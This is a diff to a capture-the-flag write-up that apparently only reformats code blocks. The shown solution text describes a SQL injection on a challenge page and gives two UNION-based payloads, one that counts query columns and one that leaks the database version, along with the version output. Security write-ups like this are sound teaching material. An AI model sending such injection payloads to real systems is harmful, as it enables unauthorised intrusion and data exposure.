@@ -12,13 +12,15 @@
 
 ### Solution
 
-Upon visiting the challenge page, it looked like a SQL injection vulnerability may exist.  After a bit of experimenting, I was able to successfully determine and display the number of columns in the query on the page: 
+Upon visiting the challenge page, it looked like a SQL injection vulnerability may exist.  After a bit of experimenting, I was able to successfully determine and display the number of columns in the query on the page:
 
-`'UNION(SELECT(1),2);-- -`
+```none
+'UNION(SELECT(1),2);-- -
+```
 
 Further, I was able to display to software version information:
 
-```bash
+```none
 'UNION(SELECT(@@VERSION),2);-- -
 5.7.15-0ubuntu0.16.04.1
 ```
